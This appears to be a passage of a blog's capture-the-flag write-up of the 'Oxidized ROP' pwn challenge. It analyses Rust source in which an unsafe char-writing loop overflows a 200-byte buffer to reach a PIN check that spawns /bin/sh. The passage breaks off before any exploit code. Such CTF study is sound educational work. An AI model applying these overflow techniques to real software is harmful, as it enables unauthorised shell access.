@@ -1,0 +1,386 @@
+<!doctype html><html lang="en"><head><title>Oxidized ROP | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. Rust. Buffer Overflow. Unicode characters. Local variable modification"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. Rust. Buffer Overflow. Unicode characters. Local variable modification"><meta itemprop="keywords" content><meta itemprop="name" content="Oxidized ROP"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. Rust. Buffer Overflow. Unicode characters. Local variable modification"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Oxidized ROP"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/oxidized-rop/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. Rust. Buffer Overflow. Unicode characters. Local variable modification"><meta name="twitter:description" content="64-bit binary. Rust. Buffer Overflow. Unicode characters. Local variable modification"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Oxidized ROP"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/oxidized-rop/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/oxidized-rop/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/oxidized-rop/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/oxidized-rop/&amp;text=Oxidized%20ROP" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/oxidized-rop/&amp;title=Oxidized%20ROP" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Oxidized ROP</h1><p class="mb4 f6 dib tracked">11 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#unicode-characters">Unicode characters</a></li></ul></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We have a 64-bit binary called <code>oxidized-rop</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
+RELRO:    <span class="code-dark-green">Full RELRO</span>
+Stack:    <span class="code-dark-red">No canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-green">PIE enabled</span>
+</code></pre></div><p>Moreover, we have the source code in Rust, so no need to reverse-engineer the binary.</p><h2 id="source-code-analysis">Source code analysis</h2><p>This is <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">    </span><span class="mtk8">print_banner</span><span class="mtk1">();</span>
+
+<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> feedback </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Feedback</span><span class="mtk1"> {</span>
+<span class="mtk1">        statement</span><span class="mtk5">:</span><span class="mtk1"> [</span><span class="mtk6">0_</span><span class="mtk8 mtku">u8</span><span class="mtk1">; </span><span class="mtk6">INPUT_SIZE</span><span class="mtk1">],</span>
+<span class="mtk1">        submitted</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">,</span>
+<span class="mtk1">    };</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> login_pin</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk8 mtku">u32</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0x11223344</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk5">loop</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk8">print_menu</span><span class="mtk1">();</span>
+<span class="mtk1">        </span><span class="mtk5">match</span><span class="mtk1"> </span><span class="mtk8">get_option</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">expect</span><span class="mtk1">(</span><span class="mtk4">"Invalid Option"</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk8 mtku">MenuOption</span><span class="mtk5">::</span><span class="mtk8 mtku">Survey</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk8">present_survey</span><span class="mtk1">(</span><span class="mtk5">&amp;mut</span><span class="mtk1"> feedback),</span>
+<span class="mtk1">            </span><span class="mtk8 mtku">MenuOption</span><span class="mtk5">::</span><span class="mtk8 mtku">ConfigPanel</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> {</span>
+<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk6">PIN_ENTRY_ENABLED</span><span class="mtk1"> {</span>
+<span class="mtk1">                    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> input </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">String</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">();</span>
+<span class="mtk1">                    </span><span class="mtk8">print!</span><span class="mtk1">(</span><span class="mtk4">"Enter configuration PIN: "</span><span class="mtk1">);</span>
+<span class="mtk1">                    </span><span class="mtk8 mtku">io</span><span class="mtk5">::</span><span class="mtk8">stdout</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">flush</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
+<span class="mtk1">                    </span><span class="mtk8 mtku">io</span><span class="mtk5">::</span><span class="mtk8">stdin</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">read_line</span><span class="mtk1">(</span><span class="mtk5">&amp;mut</span><span class="mtk1"> input)</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
+<span class="mtk1">                    login_pin </span><span class="mtk5">=</span><span class="mtk1"> input</span><span class="mtk5">.</span><span class="mtk8">parse</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">expect</span><span class="mtk1">(</span><span class="mtk4">"Invalid Pin"</span><span class="mtk1">);</span>
+<span class="mtk1">                } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Config panel login has been disabled by the admini</span><span class="mtk4">strator."</span><span class="mtk1">);</span>  
+<span class="mtk1">                }</span>
+
+<span class="mtk1">                </span><span class="mtk8">present_config_panel</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">login_pin);</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk8 mtku">MenuOption</span><span class="mtk5">::</span><span class="mtk8 mtku">Exit</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">break</span><span class="mtk1">,</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>The program defines a <code>feedback</code> structure with a <code>statement</code> array of 200 (<code>INPUT_SIZE</code>) <code>u8</code> values (initialized to <code>0</code>), and a flag <code>submitted</code> set to <code>false</code>. Then, we have a hard-coded pin (<code>0x11223344</code>).</p><p>The menu shows two options:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oxidized-rop</span>
+--------------------------------------------------------------------------
+  ______   _______ _____ _____ ____________ _____    _____   ____  _____
+ / __ \ \ / /_   _|  __ \_   _|___  /  ____|  __ \  |  __ \ / __ \|  __ \
+| |  | \ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |
+| |  | |&gt; &lt;   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/  
+| |__| / . \ _| |_| |__| || |_ / /__| |____| |__| | | | \ \| |__| | |
+ \____/_/ \_\_____|_____/_____/_____|______|_____/  |_|  \_\\____/|_|
+
+Rapid Oxidization Protection -------------------------------- by christoss
+
+
+Welcome to the Rapid Oxidization Protection Survey Portal!
+(If you have been sent by someone to complete the survey, select option 1)
+
+1. Complete Survey
+2. Config Panel
+3. Exit
+Selection:
+</code></pre></div><p>If we select the second option, we are not allowed to enter a value for <code>login_pin</code> because <code>PIN_ENTRY_ENABLED</code> is set to <code>false</code> at the beginning (a global variable). But still, the pin is checked:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oxidized-rop</span>
+--------------------------------------------------------------------------
+  ______   _______ _____ _____ ____________ _____    _____   ____  _____
+ / __ \ \ / /_   _|  __ \_   _|___  /  ____|  __ \  |  __ \ / __ \|  __ \
+| |  | \ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |
+| |  | |&gt; &lt;   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/  
+| |__| / . \ _| |_| |__| || |_ / /__| |____| |__| | | | \ \| |__| | |
+ \____/_/ \_\_____|_____/_____/_____|______|_____/  |_|  \_\\____/|_|
+
+Rapid Oxidization Protection -------------------------------- by christoss
+
+
+Welcome to the Rapid Oxidization Protection Survey Portal!
+(If you have been sent by someone to complete the survey, select option 1)
+
+1. Complete Survey
+2. Config Panel
+3. Exit
+Selection: 2
+
+Config panel login has been disabled by the administrator.
+Invalid Pin. This incident will be reported.
+
+
+Welcome to the Rapid Oxidization Protection Survey Portal!
+(If you have been sent by someone to complete the survey, select option 1)
+
+1. Complete Survey
+2. Config Panel
+3. Exit
+Selection:
+</code></pre></div><p>This is function <code>present_config_panel</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">present_config_panel</span><span class="mtk1">(pin</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">u32</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">use</span><span class="mtk1"> </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk8 mtku">process</span><span class="mtk5">::</span><span class="mtk1">{</span><span class="mtk9">self</span><span class="mtk1">, </span><span class="mtk8 mtku">Stdio</span><span class="mtk1">};</span>
+
+<span class="mtk3">    // the pin strength isn't important since pin </span><span class="mtk3">input is disabled</span>  
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">pin </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">123456</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Invalid Pin. This incident will be reported."</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk8 mtku">process</span><span class="mtk5">::</span><span class="mtk8 mtku">Command</span><span class="mtk5">::</span><span class="mtk8">new</span><span class="mtk1">(</span><span class="mtk4">"/bin/sh"</span><span class="mtk1">)</span>
+<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">stdin</span><span class="mtk1">(</span><span class="mtk8 mtku">Stdio</span><span class="mtk5">::</span><span class="mtk8">inherit</span><span class="mtk1">())</span>
+<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">stdout</span><span class="mtk1">(</span><span class="mtk8 mtku">Stdio</span><span class="mtk5">::</span><span class="mtk8">inherit</span><span class="mtk1">())</span>
+<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">output</span><span class="mtk1">()</span>
+<span class="mtk1">        </span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>So, we can see the objective. We need to somehow modify the pin in order to pass the <code>if</code> check and get a shell.</p><h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability</h3><p>Let&rsquo;s take a look at the first option (handled by <code>present_survey</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">present_survey</span><span class="mtk1">(feedback</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;mut</span><span class="mtk1"> </span><span class="mtk8 mtku">Feedback</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> feedback</span><span class="mtk5">.</span><span class="mtk1">submitted {</span>
+<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Survey with this ID already exists."</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n\n</span><span class="mtk4">Hello, our workshop is experiencing rapid oxidizat</span><span class="mtk4">ion. As we value health and"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"safety at the workspace above all we hired a ROP </span><span class="mtk4">(Rapid Oxidization Protection)  "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"service to ensure the structural safety of the wo</span><span class="mtk4">rkshop. They would like a quick "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"statement about the state of the workshop by each</span><span class="mtk4"> member of the team. This is    "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"completely confidential. Each response will be as</span><span class="mtk4">sociated with a random number   "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"in no way related to you.                        </span><span class="mtk4">                              </span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+
+<span class="mtk1">    </span><span class="mtk8">print!</span><span class="mtk1">(</span><span class="mtk4">"Statement (max 200 characters): "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">io</span><span class="mtk5">::</span><span class="mtk8">stdout</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">flush</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">unwrap</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> input_buffer </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_user_input</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk8">save_data</span><span class="mtk1">(</span><span class="mtk5">&amp;mut</span><span class="mtk1"> feedback</span><span class="mtk5">.</span><span class="mtk1">statement, </span><span class="mtk5">&amp;</span><span class="mtk1">input_buffer);</span>
+
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">{}"</span><span class="mtk1">, </span><span class="mtk4">"-"</span><span class="mtk5">.</span><span class="mtk8">repeat</span><span class="mtk1">(</span><span class="mtk6">74</span><span class="mtk1">));</span>
+
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Thanks for your statement! We will try to resolve</span><span class="mtk4"> the issues ASAP!</span><span class="mtk6">\n</span><span class="mtk4">Please now exit the program."</span><span class="mtk1">);</span>  
+
+<span class="mtk1">    </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"{}"</span><span class="mtk1">, </span><span class="mtk4">"-"</span><span class="mtk5">.</span><span class="mtk8">repeat</span><span class="mtk1">(</span><span class="mtk6">74</span><span class="mtk1">));</span>
+
+<span class="mtk1">    feedback</span><span class="mtk5">.</span><span class="mtk1">submitted </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Basically, uses <code>read_user_input</code> to read from <code>stdin</code> and <code>save_data</code> to save the results into <code>feedback.statement</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">fn</span><span class="mtk1"> </span><span class="mtk8">save_data</span><span class="mtk1">(dest</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;mut</span><span class="mtk1"> [</span><span class="mtk8 mtku">u8</span><span class="mtk1">], src</span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">String</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> src</span><span class="mtk5">.</span><span class="mtk8">chars</span><span class="mtk1">()</span><span class="mtk5">.</span><span class="mtk8">count</span><span class="mtk1">() &gt; </span><span class="mtk6">INPUT_SIZE</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk8">println!</span><span class="mtk1">(</span><span class="mtk4">"Oups, something went wrong... Please try again la</span><span class="mtk4">ter."</span><span class="mtk1">);</span>  
+<span class="mtk1">        </span><span class="mtk8 mtku">std</span><span class="mtk5">::</span><span class="mtk8 mtku">process</span><span class="mtk5">::</span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk5">mut</span><span class="mtk1"> dest_ptr </span><span class="mtk5">=</span><span class="mtk1"> dest</span><span class="mtk5">.</span><span class="mtk8">as_mut_ptr</span><span class="mtk1">() </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk5">*mut</span><span class="mtk1"> </span><span class="mtk8 mtku">char</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk5">unsafe</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> c </span><span class="mtk5">in</span><span class="mtk1"> src</span><span class="mtk5">.</span><span class="mtk8">chars</span><span class="mtk1">() {</span>
+<span class="mtk1">            dest_ptr</span><span class="mtk5">.</span><span class="mtk8">write</span><span class="mtk1">(c);</span>
